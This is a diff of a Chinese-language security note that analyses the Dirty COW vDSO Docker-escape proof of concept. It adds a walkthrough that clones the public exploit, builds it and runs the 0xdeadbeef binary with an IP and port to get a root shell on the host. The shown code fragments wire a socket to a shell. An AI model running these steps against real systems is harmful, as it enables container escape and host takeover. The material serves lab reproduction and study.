@@ -4,9 +4,11 @@ description: 脏牛漏洞-Docker逃逸
 
 # 脏牛漏洞-Docker逃逸POC\(dirtycow-vdso\)代码分析
 
+以下内容来自「CSDN博主[enjoy5512](https://me.csdn.net/enjoy5512) 的文章[脏牛漏洞-Docker逃逸POC\(dirtycow-vdso\)代码分析](https://blog.csdn.net/enjoy5512/article/details/53196047)」以及「[  
+Lyy's Blog](http://ksowo.com/)的文章--[docker用脏牛逃逸到宿主机](http://ksowo.com/2018/07/20/docker%E7%94%A8%E8%84%8F%E7%89%9B%E9%80%83%E9%80%B8%E5%88%B0%E5%AE%BF%E4%B8%BB%E6%9C%BA/)」，如有侵权，请联系删除！
 
+## 利用代码原出处
 
-利用代码原出处  
  [代码原帖](http://mp.weixin.qq.com/s?__biz=MjM5Njc3NjM4MA==&mid=2651069205&idx=3&sn=2c79678bcfcde9113f3d6848277ffa0a&chksm=bd14abc68a6322d0d5855c5d8ec3b8c5cf7c75886b3b7464c242adc1864cfb1af22bf63a39d7&mpshare=1&scene=23&srcid=1105rp9r0ZahYZNG6KJufSkp#rd)
 
 本人GitHub也保留有漏洞利用相关代码  
@@ -293,7 +295,7 @@ static int yeah(struct mem_arg *arg, int s)
 
 连接成功后,将vDSO还原
 
-```text
+```c
 if (fork() == 0) {
         if (exploit(arg, false) == -1)
             fprintf(stderr, "[-] failed to restore vDSO\n");
@@ -303,7 +305,7 @@ if (fork() == 0) {
 
 绑定输入输出到socket,处理连接数据
 
-```text
+```c
     fds[0].fd = STDIN_FILENO;
     fds[0].events = POLLIN;
 
@@ -348,4 +350,77 @@ if (fork() == 0) {
         }
     }
 ```
+
+## 容器逃逸漏洞复现
+
+测试环境虚拟机：ubuntu14.04，安装docker 
+
+1、安装docker：
+
+```text
+apt-get install docker.io
+```
+
+ 具体安装可见官方文档：[https://docs.docker.com/install/linux/docker-ce/ubuntu/](https://docs.docker.com/install/linux/docker-ce/ubuntu/)
+
+2、在docker中pull一个ubuntu:14.04
+
+```text
+docker pull ubuntu:14.04docker images
+```
+
+看看已有容器
+
+![](http://ksowo.com/images/blog/docker/1.png)
+
+3、 接下来我们创建一个守护态的Docker容器，然后使用docker attach命令进入该容器。
+
+```text
+docker run -itd ubuntu:14.04 /bin/bash
+```
+
+4、然后我们使用docker ps查看到该容器CONTAINER ID信息，接下来就使用docker attach进入该容器
+
+```text
+docker attach CONTAINER ID
+```
+
+![](http://ksowo.com/images/blog/docker/2.png)
+
+5、安装编译软件，下载exp
+
+```text
+apt-get install -y build-essential
+apt-get install -y nasm
+apt-get install -y git
+git clone https://github.com/scumjr/dirtycow-vdso
+make
+ifconfig
+```
+
+make完后在目录多出一个0xdeadbeef,执行命令：  
+./0xdeadbeef docker的IP:端口
+
+![](http://ksowo.com/images/blog/docker/3.png)
+
+等一会然后发现终端没输出了，在里面输入命令会有回显
+
+![](http://ksowo.com/images/blog/docker/4.png)
+
+对比IP地址，上图为宿主，下图为docker容器
+
+![](http://ksowo.com/images/blog/docker/5.png)
+
+6、提权原理可以看  
+[https://bbs.pediy.com/thread-220057.htm](https://bbs.pediy.com/thread-220057.htm)  
+[https://blog.csdn.net/enjoy5512/article/details/53196047](https://blog.csdn.net/enjoy5512/article/details/53196047)
+
+7、用下面2中方式启动容器依然可以
+
+```c
+docker run --cap-drop setuid -itd zangniu:1 /bin/bash
+docker --selinux-enabled=false run -itd zangniu:1 /bin/bash
+```
+
+
 
